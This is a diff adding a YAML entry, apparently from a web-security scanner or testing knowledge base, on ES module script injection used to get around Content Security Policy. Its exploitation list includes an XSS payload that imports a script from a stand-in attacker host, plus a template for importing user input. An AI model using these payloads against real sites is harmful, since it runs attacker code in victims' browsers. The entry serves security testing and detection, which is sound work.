@@ -1,0 +1,19 @@
+id: MODULE_SCRIPT_INJECTION
+name: ES Module Script Injection
+cwe:
+- CWE-79
+owasp: A03:2021 Injection
+severity_range: High
+description: Bypassing CSP via ES module imports with attacker-controlled specifiers.
+detection:
+  strategy:
+  - Find injection points reflected in <script type='module'> contexts
+  - Test import() expressions with attacker-controlled URLs
+  - Check CSP unsafe-eval and inline-script policies
+  - Test dynamic import() with non-HTTPS or cross-origin URLs
+exploitation:
+- 'Inject: <script type=module>import(''https://attacker.com/x.js'')</script>'
+- 'Or: <script type=module>import(USER_INPUT)</script>'
+- Module loads bypass some CSP configurations that block inline scripts
+references:
+- https://portswigger.net/research/javascript-pollution-attacks
